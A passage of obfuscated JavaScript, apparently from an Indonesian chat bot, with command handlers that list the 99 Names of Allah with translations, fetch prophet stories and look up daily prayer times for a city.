0x240d04(0x172a)]);let _0x3430e4=_0x1ce978[_0x240d04(0xa94)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2a59)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'text2':_0x83dd4c,'thumb':_0x345085},_0x1ce978[_0x240d04(0x2536)]),_0x8d9eba=await fetch(_0x3430e4);if(!_0x8d9eba['ok'])throw await _0x8d9eba[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x3430e4},{'caption':lang['ok']});}else{let _0x1c1797=_0x278feb[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xb97)](_0x221df9,0x36ee80)),_0x16e6e3=_0x1ce978[_0x240d04(0x82d)](_0x26e70c[_0x240d04(0xf02)](_0x1ce978['CdQRP'](_0x22ed61,0xea60)),0x3c),_0x140735=_0x1ce978['rLyzc'](_0x34a445[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x279d)](_0x59304a,0x3e8)),0x3c);return[_0x1c1797,_0x16e6e3,_0x140735]['map'](_0x6bf125=>_0x6bf125[_0x240d04(0x2cb7)]()['padStart'](0x2,0x0))[_0x240d04(0x86e)](':');}}}}break;case _0x1ce978[_0x240d04(0x1e51)]:{global[_0x240d04(0x2c57)+'a']={'result':{'data':[{'index':'1','latin':_0x1ce978[_0x240d04(0xed6)],'arabic':_0x1ce978['OnrWU'],'translation_id':_0x1ce978[_0x240d04(0x2191)],'translation_en':_0x1ce978[_0x240d04(0x2078)]},{'index':'2','latin':_0x1ce978[_0x240d04(0xae1)],'arabic':_0x1ce978['Knkxn'],'translation_id':_0x1ce978[_0x240d04(0x27f4)],'translation_en':_0x1ce978[_0x240d04(0x2855)]},{'index':'3','latin':_0x1ce978['pEqgc'],'arabic':_0x1ce978[_0x240d04(0x162c)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+'\x20sifat\x20Mer'+_0x240d04(0x2d8)+_0x240d04(0x493),'translation_en':_0x1ce978[_0x240d04(0x236c)]},{'index':'4','latin':_0x1ce978['FUKfQ'],'arabic':'الْقُدُّوس'+'ُ','translation_id':_0x1ce978[_0x240d04(0xb52)],'translation_en':_0x1ce978[_0x240d04(0x1bc0)]},{'index':'5','latin':'As\x20Salaam','arabic':_0x1ce978['ccMFL'],'translation_id':_0x1ce978['juzzM'],'translation_en':_0x1ce978[_0x240d04(0xe9a)]},{'index':'6','latin':_0x1ce978[_0x240d04(0x2815)],'arabic':_0x240d04(0x27ad)+'ُ','translation_id':_0x1ce978[_0x240d04(0x2215)],'translation_en':_0x1ce978['vbDDD']},{'index':'7','latin':_0x1ce978[_0x240d04(0xfd7)],'arabic':_0x1ce978[_0x240d04(0x2497)],'translation_id':_0x1ce978['dDpkD'],'translation_en':_0x1ce978[_0x240d04(0x611)]},{'index':'8','latin':_0x1ce978[_0x240d04(0x23af)],'arabic':_0x1ce978[_0x240d04(0x167)],'translation_id':_0x1ce978[_0x240d04(0x2b83)],'translation_en':_0x1ce978[_0x240d04(0x1d32)]},{'index':'9','latin':_0x240d04(0x33a),'arabic':'الْجَبَّار'+'ُ','translation_id':_0x1ce978[_0x240d04(0x1431)],'translation_en':_0x1ce978[_0x240d04(0xca4)]},{'index':'10','latin':_0x1ce978['xZGFG'],'arabic':_0x1ce978[_0x240d04(0x26c3)],'translation_id':_0x1ce978[_0x240d04(0x9d0)],'translation_en':_0x1ce978[_0x240d04(0x1a56)]},{'index':'11','latin':_0x240d04(0x291e),'arabic':_0x1ce978[_0x240d04(0xe34)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0x2188)+_0x240d04(0x1418),'translation_en':_0x1ce978['xZgAB']},{'index':'12','latin':_0x240d04(0x23a3),'arabic':_0x1ce978[_0x240d04(0x1dd6)],'translation_id':_0x1ce978[_0x240d04(0x2c3b)],'translation_en':_0x1ce978[_0x240d04(0xc1)]},{'index':'13','latin':_0x1ce978[_0x240d04(0x20cc)],'arabic':_0x1ce978[_0x240d04(0x3ee)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+'\x20sifat\x20Yan'+_0x240d04(0x1917)+_0x240d04(0x21b)+'hluknya)','translation_en':_0x1ce978[_0x240d04(0x1a42)]},{'index':'14','latin':_0x240d04(0x2bca)+'r','arabic':_0x240d04(0x539)+'ُ','translation_id':_0x1ce978[_0x240d04(0x234a)],'translation_en':_0x240d04(0x2c02)+'orgiving'},{'index':'15','latin':_0x1ce978[_0x240d04(0x7a1)],'arabic':_0x1ce978[_0x240d04(0x1ad6)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+'\x20sifat\x20Mem'+_0x240d04(0xce1),'translation_en':_0x240d04(0x1fa8)+_0x240d04(0x1b70)+'ubduer'},{'index':'16','latin':_0x1ce978[_0x240d04(0xd6f)],'arabic':_0x1ce978[_0x240d04(0x10b8)],'translation_id':_0x1ce978[_0x240d04(0x1368)],'translation_en':_0x1ce978[_0x240d04(0x2428)]},{'index':'17','latin':_0x240d04(0x11d6),'arabic':_0x1ce978[_0x240d04(0x1e2f)],'translation_id':_0x1ce978[_0x240d04(0x11d4)],'translation_en':_0x1ce978[_0x240d04(0x2e27)]},{'index':'18','latin':_0x240d04(0x593),'arabic':_0x240d04(0xa30)+'ُ','translation_id':_0x1ce978[_0x240d04(0x2c07)],'translation_en':_0x1ce978[_0x240d04(0xa2b)]},{'index':'19','latin':_0x240d04(0x24db),'arabic':_0x1ce978[_0x240d04(0x401)],'translation_id':_0x1ce978['gehSz'],'translation_en':_0x1ce978[_0x240d04(0x14d8)]},{'index':'20','latin':_0x1ce978[_0x240d04(0x2d32)],'arabic':_0x1ce978['ugLsh'],'translation_id':_0x1ce978[_0x240d04(0x112c)],'translation_en':_0x1ce978[_0x240d04(0x26df)]},{'index':'21','latin':_0x1ce978[_0x240d04(0x2e1e)],'arabic':_0x1ce978[_0x240d04(0xe6c)],'translation_id':_0x1ce978['RUHPG'],'translation_en':_0x1ce978[_0x240d04(0xf05)]},{'index':'22','latin':_0x240d04(0x1ff0)+'h','arabic':_0x1ce978[_0x240d04(0x789)],'translation_id':_0x1ce978[_0x240d04(0x16e)],'translation_en':_0x1ce978[_0x240d04(0x1c60)]},{'index':'23','latin':_0x1ce978[_0x240d04(0x2c4d)],'arabic':_0x1ce978['jwams'],'translation_id':_0x1ce978['FDuKd'],'translation_en':_0x1ce978[_0x240d04(0x923)]},{'index':'24','latin':_0x240d04(0x93d),'arabic':_0x240d04(0x1663),'translation_id':_0x1ce978[_0x240d04(0x25bf)],'translation_en':_0x1ce978[_0x240d04(0x17a6)]},{'index':'25','latin':_0x1ce978[_0x240d04(0x16c0)],'arabic':_0x1ce978[_0x240d04(0x15d2)],'translation_id':_0x1ce978[_0x240d04(0x8ba)],'translation_en':_0x1ce978[_0x240d04(0x271d)]},{'index':'26','latin':_0x1ce978[_0x240d04(0x438)],'arabic':'السَّمِيعُ','translation_id':_0x1ce978[_0x240d04(0xb60)],'translation_en':_0x1ce978[_0x240d04(0x1232)]},{'index':'27','latin':_0x1ce978['YggWv'],'arabic':_0x240d04(0x622),'translation_id':_0x1ce978[_0x240d04(0x1c65)],'translation_en':'The\x20All\x20Se'+'eing'},{'index':'28','latin':_0x240d04(0x1674),'arabic':_0x1ce978['yzrvE'],'translation_id':_0x1ce978[_0x240d04(0x2790)],'translation_en':_0x1ce978[_0x240d04(0x1c8c)]},{'index':'29','latin':_0x1ce978['tTqrI'],'arabic':_0x1ce978[_0x240d04(0x1857)],'translation_id':_0x1ce978[_0x240d04(0x25ac)],'translation_en':_0x240d04(0x22d6)+_0x240d04(0x27a9)},{'index':'30','latin':_0x1ce978[_0x240d04(0x187)],'arabic':_0x240d04(0x33d),'translation_id':'Yang\x20Memil'+_0x240d04(0x18b7)+_0x240d04(0xafe)+'a\x20Lembut','translation_en':_0x1ce978[_0x240d04(0x195c)]},{'index':'31','latin':_0x1ce978[_0x240d04(0x214e)],'arabic':_0x1ce978[_0x240d04(0x28b3)],'translation_id':_0x240d04(0x28d2)+'iki\x20Mutlak'+_0x240d04(0x23b8)+'\x20Mengetahu'+_0x240d04(0x1fc6),'translation_en':_0x1ce978[_0x240d04(0x2498)]},{'index':'32','latin':_0x1ce978['morYZ'],'arabic':'الْحَلِيمُ','translation_id':_0x1ce978[_0x240d04(0x71b)],'translation_en':_0x1ce978['wQrTt']},{'index':'33','latin':_0x1ce978[_0x240d04(0x1b45)],'arabic':_0x1ce978['sjLGQ'],'translation_id':_0x1ce978[_0x240d04(0x258d)],'translation_en':_0x240d04(0x25ae)+_0x240d04(0x2dcc)+_0x240d04(0x2259)},{'index':'34','latin':_0x1ce978[_0x240d04(0x1245)],'arabic':_0x1ce978[_0x240d04(0x242f)],'translation_id':_0x1ce978[_0x240d04(0x7a8)],'translation_en':_0x1ce978[_0x240d04(0x1282)]},{'index':'35','latin':_0x1ce978['xCClZ'],'arabic':_0x240d04(0xb3d),'translation_id':_0x1ce978['IcLwp'],'translation_en':'The\x20Gratef'+'ul'},{'index':'36','latin':_0x1ce978['fWaev'],'arabic':'الْعَلِيُّ','translation_id':_0x1ce978[_0x240d04(0x1a96)],'translation_en':_0x1ce978[_0x240d04(0x2db1)]},{'index':'37','latin':_0x1ce978[_0x240d04(0x2f5)],'arabic':_0x1ce978['frAGD'],'translation_id':_0x1ce978[_0x240d04(0x20f2)],'translation_en':_0x1ce978[_0x240d04(0x1a1c)]},{'index':'38','latin':_0x1ce978[_0x240d04(0x445)],'arabic':_0x1ce978[_0x240d04(0xe5e)],'translation_id':_0x1ce978[_0x240d04(0x2eaf)],'translation_en':_0x1ce978[_0x240d04(0x2e89)]},{'index':'39','latin':_0x1ce978[_0x240d04(0x12e6)],'arabic':_0x1ce978[_0x240d04(0x47c)],'translation_id':_0x1ce978[_0x240d04(0x122e)],'translation_en':'The\x20Nouris'+'her'},{'index':'40','latin':_0x1ce978[_0x240d04(0xb6c)],'arabic':_0x240d04(0xd18),'translation_id':_0x1ce978[_0x240d04(0x2027)],'translation_en':_0x1ce978[_0x240d04(0x2c8d)]},{'index':'41','latin':_0x1ce978[_0x240d04(0xe84)],'arabic':_0x1ce978[_0x240d04(0x137)],'translation_id':_0x1ce978[_0x240d04(0x2348)],'translation_en':_0x1ce978['riVsz']},{'index':'42','latin':_0x1ce978[_0x240d04(0x5b3)],'arabic':_0x1ce978[_0x240d04(0x264c)],'translation_id':_0x1ce978[_0x240d04(0x1df4)],'translation_en':_0x1ce978[_0x240d04(0x14cb)]},{'index':'43','latin':_0x1ce978[_0x240d04(0x2a06)],'arabic':_0x1ce978['SMtdD'],'translation_id':_0x1ce978[_0x240d04(0x5d0)],'translation_en':_0x1ce978['REZCL']},{'index':'44','latin':_0x1ce978[_0x240d04(0xd48)],'arabic':_0x1ce978[_0x240d04(0x1ca4)],'translation_id':_0x1ce978[_0x240d04(0x2836)],'translation_en':_0x240d04(0x2ea1)+_0x240d04(0x6a6)+_0x240d04(0x174d)},{'index':'45','latin':_0x240d04(0x2936),'arabic':_0x1ce978[_0x240d04(0x11a0)],'translation_id':_0x1ce978[_0x240d04(0x112d)],'translation_en':_0x1ce978[_0x240d04(0x1d6c)]},{'index':'46','latin':_0x1ce978[_0x240d04(0xea6)],'arabic':_0x1ce978['gytHh'],'translation_id':_0x1ce978[_0x240d04(0x157f)],'translation_en':'The\x20Wise'},{'index':'47','latin':_0x1ce978[_0x240d04(0x65a)],'arabic':_0x1ce978['GZfHR'],'translation_id':_0x1ce978[_0x240d04(0x2ba5)],'translation_en':_0x1ce978['QKXfm']},{'index':'48','latin':'Al\x20Majiid','arabic':_0x240d04(0xbd8),'translation_id':_0x1ce978[_0x240d04(0x2348)],'translation_en':_0x1ce978['koBLa']},{'index':'49','latin':_0x1ce978[_0x240d04(0x11b9)],'arabic':_0x1ce978['cAgaJ'],'translation_id':_0x1ce978[_0x240d04(0x18c6)],'translation_en':_0x1ce978[_0x240d04(0x2fd)]},{'index':'50','latin':'As\x20Syahiid','arabic':_0x1ce978[_0x240d04(0x660)],'translation_id':_0x1ce978[_0x240d04(0x1b5f)],'translation_en':_0x1ce978['etKTD']},{'index':'51','latin':_0x1ce978[_0x240d04(0x1565)],'arabic':_0x240d04(0x1bdf),'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+_0x240d04(0x2ebb),'translation_en':_0x1ce978['iipcb']},{'index':'52','latin':_0x1ce978['gbzaM'],'arabic':_0x240d04(0x20a1),'translation_id':_0x1ce978[_0x240d04(0x1dad)],'translation_en':_0x1ce978[_0x240d04(0x935)]},{'index':'53','latin':_0x1ce978[_0x240d04(0x12dc)],'arabic':_0x1ce978[_0x240d04(0x2616)],'translation_id':_0x1ce978[_0x240d04(0x28e7)],'translation_en':_0x1ce978[_0x240d04(0x772)]},{'index':'54','latin':_0x1ce978[_0x240d04(0x166)],'arabic':_0x1ce978[_0x240d04(0x1387)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+'a\x20Kokoh','translation_en':_0x1ce978[_0x240d04(0x619)]},{'index':'55','latin':_0x240d04(0x1c2),'arabic':_0x1ce978[_0x240d04(0x3d8)],'translation_id':_0x1ce978[_0x240d04(0x1148)],'translation_en':_0x1ce978[_0x240d04(0xbb8)]},{'index':'56','latin':_0x1ce978['twMRC'],'arabic':_0x1ce978['BbwYT'],'translation_id':_0x1ce978[_0x240d04(0x179d)],'translation_en':_0x240d04(0x22a6)+_0x240d04(0x17af)},{'index':'57','latin':_0x1ce978[_0x240d04(0x2ec2)],'arabic':_0x1ce978[_0x240d04(0x5e3)],'translation_id':_0x1ce978[_0x240d04(0x2040)],'translation_en':_0x1ce978['MRvEq']},{'index':'58','latin':_0x1ce978[_0x240d04(0x1080)],'arabic':_0x1ce978[_0x240d04(0x1247)],'translation_id':_0x1ce978[_0x240d04(0x877)],'translation_en':_0x240d04(0x1fe1)+_0x240d04(0x3b3)+_0x240d04(0x1cb3)+_0x240d04(0x2649)+_0x240d04(0x22bb)},{'index':'59','latin':_0x1ce978[_0x240d04(0xcb1)],'arabic':_0x1ce978[_0x240d04(0xb21)],'translation_id':_0x1ce978[_0x240d04(0x505)],'translation_en':_0x1ce978[_0x240d04(0x1a58)]},{'index':'60','latin':_0x1ce978[_0x240d04(0xcf8)],'arabic':_0x240d04(0x2bb4),'translation_id':_0x1ce978[_0x240d04(0x24e6)],'translation_en':_0x1ce978[_0x240d04(0x9a6)]},{'index':'61','latin':_0x1ce978[_0x240d04(0x2290)],'arabic':_0x1ce978[_0x240d04(0x2e11)],'translation_id':_0x1ce978[_0x240d04(0x1b4f)],'translation_en':_0x1ce978['SypJJ']},{'index':'62','latin':_0x1ce978[_0x240d04(0x2ae1)],'arabic':_0x1ce978[_0x240d04(0x16f3)],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+_0x240d04(0x404),'translation_en':_0x240d04(0x2261)+'iving'},{'index':'63','latin':_0x1ce978[_0x240d04(0x165c)],'arabic':_0x240d04(0x400)+'ُ','translation_id':_0x1ce978['bNpCd'],'translation_en':_0x1ce978[_0x240d04(0x1c4a)]},{'index':'64','latin':_0x240d04(0xfcb),'arabic':_0x1ce978['lLDYq'],'translation_id':'Yang\x20Memil'+_0x240d04(0x18b7)+'\x20sifat\x20Mah'+'a\x20Penemu','translation_en':_0x1ce978['iomls']},{'index':'65','latin':_0x1ce978[_0x240d04(0x131c)],'arabic':'الْمَاجِدُ','translation_id':_0x1ce978['nmvrs'],'translation_en':_0x1ce978[_0x240d04(0x276f)]},{'index':'66','latin':'Al\x20Wahiid','arabic':_0x240d04(0xee5),'translation_id':_0x1ce978[_0x240d04(0x291f)],'translation_en':_0x240d04(0x1d47)+_0x240d04(0x8fe)+'\x20Manifesta'+_0x240d04(0x1755)+'ity'},{'index':'67','latin':_0x1ce978[_0x240d04(0x2e70)],'arabic':'اَلاَحَدُ','translation_id':_0x1ce978['jIHew'],'translation_en':_0x1ce978['SZVZU']},{'index':'68','latin':_0x1ce978[_0x240d04(0x1d95)],'arabic':_0x1ce978[_0x240d04(0xc24)],'translation_id':_0x1ce978['qGMwQ'],'translation_en':_0x1ce978[_0x240d04(0x1e69)]},{'index':'69','latin':_0x1ce978['cieUJ'],'arabic':_0x1ce978[_0x240d04(0x1b11)],'translation_id':_0x1ce978['lPpKY'],'translation_en':_0x240d04(0x2ed4)+'le'},{'index':'70','latin':_0x240d04(0x434)+'r','arabic':_0x240d04(0x16d)+_0x240d04(0x25dc),'translation_id':_0x240d04(0x28d2)+'iki\x20Mutlak'+_0x240d04(0xafe)+_0x240d04(0x79d),'translation_en':_0x1ce978[_0x240d04(0x2d89)]},{'index':'71','latin':_0x240d04(0xedc)+'m','arabic':_0x1ce978[_0x240d04(0x44e)],'translation_id':_0x1ce978['HzZct'],'translation_en':_0x1ce978[_0x240d04(0x1b7d)]},{'index':'72','latin':_0x1ce978['jRKvE'],'arabic':'الْمُؤَخِّ'+'رُ','translation_id':_0x1ce978[_0x240d04(0x2604)],'translation_en':_0x1ce978[_0x240d04(0x1742)]},{'index':'73','latin':_0x240d04(0x1d8d),'arabic':_0x1ce978['yMWZu'],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+_0x240d04(0x2834),'translation_en':_0x1ce978[_0x240d04(0x1266)]},{'index':'74','latin':_0x1ce978[_0x240d04(0x1a09)],'arabic':_0x1ce978[_0x240d04(0x16f5)],'translation_id':_0x1ce978[_0x240d04(0x2bbe)],'translation_en':'The\x20Last'},{'index':'75','latin':_0x1ce978[_0x240d04(0x2e9a)],'arabic':_0x240d04(0x5ae),'translation_id':'Yang\x20Memil'+_0x240d04(0x18b7)+_0x240d04(0xafe)+'a\x20Nyata','translation_en':_0x1ce978['nlETs']},{'index':'76','latin':'Al\x20Baathin','arabic':_0x1ce978[_0x240d04(0x186)],'translation_id':_0x1ce978[_0x240d04(0x4ae)],'translation_en':_0x1ce978[_0x240d04(0x21c7)]},{'index':'77','latin':_0x1ce978[_0x240d04(0x1cd0)],'arabic':_0x1ce978[_0x240d04(0x2c51)],'translation_id':_0x1ce978['aJWNI'],'translation_en':_0x1ce978[_0x240d04(0xb1d)]},{'index':'78','latin':_0x1ce978[_0x240d04(0x22e5)],'arabic':_0x1ce978[_0x240d04(0x12a4)],'translation_id':_0x1ce978['CdPtz'],'translation_en':_0x1ce978[_0x240d04(0x1e32)]},{'index':'79','latin':_0x240d04(0x2b64),'arabic':_0x1ce978['lKGjm'],'translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+_0x240d04(0x2263),'translation_en':_0x1ce978['UATzR']},{'index':'80','latin':_0x1ce978['gbAFa'],'arabic':_0x1ce978[_0x240d04(0x2685)],'translation_id':_0x1ce978[_0x240d04(0x395)],'translation_en':_0x1ce978['iVOwS']},{'index':'81','latin':_0x1ce978[_0x240d04(0xfa9)],'arabic':_0x240d04(0x1dbd)+_0x240d04(0xc43),'translation_id':_0x1ce978[_0x240d04(0x274c)],'translation_en':_0x240d04(0x155a)+'r'},{'index':'82','latin':_0x1ce978[_0x240d04(0x1ed9)],'arabic':_0x1ce978['kMYwb'],'translation_id':'Yang\x20Memil'+'iki\x20Mutlak'+_0x240d04(0xafe)+_0x240d04(0x2943),'translation_en':_0x1ce978[_0x240d04(0x22eb)]},{'index':'83','latin':_0x1ce978[_0x240d04(0xa56)],'arabic':_0x1ce978['ztthY'],'translation_id':_0x1ce978['KlNwJ'],'translation_en':_0x1ce978['wCMad']},{'index':'84','latin':_0x1ce978[_0x240d04(0xaa4)],'arabic':_0x1ce978[_0x240d04(0x1e6a)],'translation_id':_0x1ce978[_0x240d04(0x133a)],'translation_en':_0x1ce978[_0x240d04(0x1008)]},{'index':'85','latin':_0x1ce978[_0x240d04(0x1d2e)],'arabic':_0x1ce978[_0x240d04(0x2004)],'translation_id':_0x1ce978[_0x240d04(0x10e2)],'translation_en':_0x1ce978[_0x240d04(0xf0f)]},{'index':'86','latin':_0x1ce978['LoEAg'],'arabic':_0x1ce978[_0x240d04(0x2ab3)],'translation_id':_0x1ce978['LTSBo'],'translation_en':_0x1ce978['IkYeU']},{'index':'87','latin':_0x1ce978[_0x240d04(0x2e10)],'arabic':'الْجَامِعُ','translation_id':_0x1ce978['LpFwO'],'translation_en':_0x240d04(0x19df)+_0x240d04(0xfc9)+_0x240d04(0x2711)},{'index':'88','latin':_0x1ce978[_0x240d04(0x16a2)],'arabic':'الْغَنِيُّ','translation_id':_0x1ce978[_0x240d04(0x2612)],'translation_en':_0x240d04(0xdfa)+'ch,\x20the\x20In'+_0x240d04(0x4fb)},{'index':'89','latin':_0x1ce978[_0x240d04(0x1985)],'arabic':_0x1ce978[_0x240d04(0x1c02)],'translation_id':_0x1ce978[_0x240d04(0x353)],'translation_en':_0x240d04(0x51d)+_0x240d04(0x2837)+_0x240d04(0x1a63)},{'index':'90','latin':_0x1ce978['KoJeZ'],'arabic':_0x240d04(0x27e5)+'ُ','translation_id':_0x1ce978[_0x240d04(0x151e)],'translation_en':_0x1ce978[_0x240d04(0x1468)]},{'index':'91','latin':_0x240d04(0x12e0),'arabic':_0x1ce978[_0x240d04(0xe6b)],'translation_id':_0x1ce978[_0x240d04(0x1c92)],'translation_en':_0x1ce978['HJszF']},{'index':'92','latin':_0x1ce978[_0x240d04(0x1ae5)],'arabic':_0x1ce978[_0x240d04(0x12c5)],'translation_id':_0x1ce978[_0x240d04(0xe53)],'translation_en':_0x1ce978[_0x240d04(0x2e29)]},{'index':'93','latin':_0x1ce978['VNTLO'],'arabic':_0x1ce978['NeepT'],'translation_id':_0x1ce978[_0x240d04(0x1225)],'translation_en':'The\x20Light'},{'index':'94','latin':_0x1ce978[_0x240d04(0x14e2)],'arabic':_0x240d04(0x1fc1),'translation_id':_0x1ce978[_0x240d04(0x1b0e)],'translation_en':_0x1ce978['qGPpk']},{'index':'95','latin':_0x1ce978[_0x240d04(0x1248)],'arabic':'الْبَدِيعُ','translation_id':_0x240d04(0x28d2)+_0x240d04(0x18b7)+_0x240d04(0xafe)+_0x240d04(0x7ba),'translation_en':_0x1ce978['qPyPr']},{'index':'96','latin':_0x1ce978[_0x240d04(0x2944)],'arabic':_0x1ce978[_0x240d04(0x2267)],'translation_id':_0x1ce978[_0x240d04(0x25e7)],'translation_en':_0x1ce978[_0x240d04(0x1166)]},{'index':'97','latin':_0x1ce978[_0x240d04(0x1b32)],'arabic':_0x1ce978[_0x240d04(0x7f1)],'translation_id':_0x1ce978[_0x240d04(0xbe0)],'translation_en':_0x1ce978[_0x240d04(0x2c19)]},{'index':'98','latin':_0x1ce978[_0x240d04(0x2171)],'arabic':_0x1ce978[_0x240d04(0xbeb)],'translation_id':_0x1ce978[_0x240d04(0x1ec4)],'translation_en':'The\x20Guide,'+_0x240d04(0x14b5)+_0x240d04(0x155f)+_0x240d04(0x75e)+'r'},{'index':'99','latin':_0x1ce978[_0x240d04(0x2aca)],'arabic':'الصَّبُورُ','translation_id':_0x1ce978['CgqCy'],'translation_en':'The\x20Patien'+'t'}]}};let _0x593c83=JSON[_0x240d04(0x1cf5)](global['asmaulhusn'+'a']),_0x26057e=JSON[_0x240d04(0x1c34)](_0x593c83),_0x15df09=_0x26057e['result'][_0x240d04(0x2bb6)][_0x240d04(0x16e6)]((_0x32d848,_0x25bad0)=>_0x25bad0+0x1+'.\x20'+_0x32d848[_0x240d04(0x824)]+'\x0a'+_0x32d848[_0x240d04(0x1ad0)]+'\x0a'+_0x32d848[_0x240d04(0x443)+_0x240d04(0x118e)])['join']('\x0a\x0a');if(_0x483c03[0x0]){if(_0x1ce978[_0x240d04(0x21ee)](_0x1ce978[_0x240d04(0x2bf5)],_0x1ce978['qMLYI'])){if(_0x1ce978['TwwrM'](_0x483c03[0x0],0x1))throw _0x240d04(0x20c4);if(_0x1ce978['PrNIW'](_0x483c03[0x0],0x63))throw _0x240d04(0x430)+'9!';let {index:_0x9c39d7,latin:_0x47159b,arabic:_0x54abfe,translation_id:_0x3cebdf,translation_en:_0x11695d}=_0x26057e[_0x240d04(0x17dd)]['data']['find'](_0xbfa27c=>_0xbfa27c[_0x240d04(0x629)]==_0x483c03[0x0]);return _0x1ce978[_0x240d04(0x11da)](_0x476bfb,_0x240d04(0x16c2)+_0x9c39d7+'\x0a\x0a'+_0x47159b+'\x20\x0a'+_0x54abfe+'\x0a'+_0x3cebdf+'\x20\x0a'+_0x11695d+'\x20\x20\x0a');}else _0x1ce978[_0x240d04(0x2d87)](_0x1b1637,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x2b72)](_0x5ec569,_0x38411b)+'*'),delete _0x23181c[_0x27ebe4];}contoh=_0x240d04(0xa8e)+_0x240d04(0x21e5),anjuran=_0x240d04(0x19b7)+_0x240d04(0xe4d)+'\x20radhialla'+_0x240d04(0x2b46)+_0x240d04(0x49f)+'Saw\x20bersab'+_0x240d04(0x2131)+'\x20لِلَّهِ\x20ت'+'َعَالَى\x20تِ'+_0x240d04(0x2bb0)+'ِسْعِينَ\x20ا'+_0x240d04(0x589)+_0x240d04(0x260a)+_0x240d04(0x145d)+_0x240d04(0x2d88)+_0x240d04(0x26e5)+_0x240d04(0x23f)+_0x240d04(0x253c)+_0x240d04(0x179f)+'تْرَ\x22\x0a\x0aArt'+_0x240d04(0x191b)+_0x240d04(0x11ec)+_0x240d04(0x2655)+_0x240d04(0x1fa2)+_0x240d04(0x64b)+_0x240d04(0x1806)+_0x240d04(0x1842)+'s\x20seratus\x20'+_0x240d04(0x773)+_0x240d04(0x26f8)+_0x240d04(0x25b)+_0x240d04(0x2808)+_0x240d04(0xe27)+_0x240d04(0x2d42)+_0x240d04(0x2a17)+_0x240d04(0x1542)+_0x240d04(0x1c76)+_0x240d04(0x9d4)+_0x240d04(0x1c8),_0x1ce978[_0x240d04(0x26fc)](_0x476bfb,_0x1ce978[_0x240d04(0x86c)](contoh+_0x15df09,anjuran));}break;case _0x1ce978['KilcU']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2d7)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x4c9)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2cf6)+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+':\x0a`')+(_0x1ec495+_0x3e6565)+'\x20Adam`');let _0x2642bc=await _0x1ce978[_0x240d04(0x326)](fetch,_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0xb84)+_0x240d04(0x178e)+'in/data/ki'+'sahnabi/'+_0x33cfb1+_0x240d04(0x2e4c)),_0x5636e7=await _0x2642bc['json'](),_0xfaebe1='Nabi\x20:\x20'+_0x5636e7[_0x240d04(0x8f0)]+(_0x240d04(0x130a)+_0x240d04(0x235d))+_0x5636e7[_0x240d04(0x7e3)+_0x240d04(0xce0)]+(_0x240d04(0x2165)+_0x240d04(0x1567))+_0x5636e7['tmp']+_0x240d04(0x21ed)+_0x5636e7[_0x240d04(0x137c)]+_0x240d04(0x3ed)+_0x5636e7[_0x240d04(0x5fc)+'n'];_0x476bfb(_0xfaebe1);}break;case _0x1ce978[_0x240d04(0x301)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1037)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['AwWLx'](_0x1ec495,_0x3e6565)+(_0x240d04(0xbc7)+_0x240d04(0x19f8)+'h\x20pengguna'+'an:\x0a`')+_0x1ce978[_0x240d04(0xc96)](_0x1ec495,_0x3e6565)+_0x240d04(0x2b1c));const _0x10e995=_0x33cfb1,_0x20ffeb=_0x240d04(0x2e5e)+_0x240d04(0x21a4)+_0x240d04(0x735)+_0x240d04(0x48b)+_0x240d04(0x1c5f)+_0x10e995+('&country=I'+_0x240d04(0x8dc)+_0x240d04(0x24ec));let _0x18202c=await axios[_0x240d04(0x1a6)](_0x20ffeb);const _0x47080f=_0x18202c['data'][_0x240d04(0x2bb6)],_0x41a186=_0x47080f[_0x240d04(0x2ea9)];let _0x5ab11b=_0x240d04(0x204e)+_0x240d04(0x2d69)+_0x10e995+'*:\x0aSubuh:\x20'+_0x41a186[_0x240d04(0xe4e)]+_0x240d04(0x1313)+_0x41a186['Imsak']+'\x0aDzuhur:\x20'+_0x41a186[_0x240d04(0x1e73)]+_0x240d04(0x164e)+_0x41a186[_0x240d04(0x1b2f)]+'\x0aMaghrib:\x20'+_0x41a186['Maghrib']+'\x0aIsya:\x20'+_0x41a186[_0x240d04(0x1731)]+('\x0a\x0a*\x22\x20Siapa'+'\x20saja\x20yang'+_0x240d04(0x9c8)+_0x240d04(0x1843)+_0x240d04(0x22fa)+'mendapatka'+_0x240d04(0x16f)+_0x240d04(0xba7)+'dan\x20kesela'+_0x240d04(0x991)+_0x240d04(0x236e)+'at.\x20\x22*\x0a');_0x1ce978[_0x240d04(0xb9d)](_0x476bfb,_0x5ab11b),console[_0x240d04(0x1e13)](_0x240d04(0x204e)+_0x240d04(0x94e)+_0x10e995+':'),console[_0x240d04(0x1e13)](_0x240d04(0x2d25)+_0x41a186['Fajr']),console[_0x240d04(0x1e13)](_0x240d04(0x1306)+_0x240d04(0x154a)+_0x41a186[_0x240d04(0x277c)]),console[_0x240d04(0x1e13)]('Dzuhur:\x20'+_0x41a186[_0x240d04(0x1e73)]),console[_0x240d04(0x1e13)](_0x240d04(0x2309)+_0x41a186[_0x240d04(0x1b2f)]),console[_0x240d04(0x1e13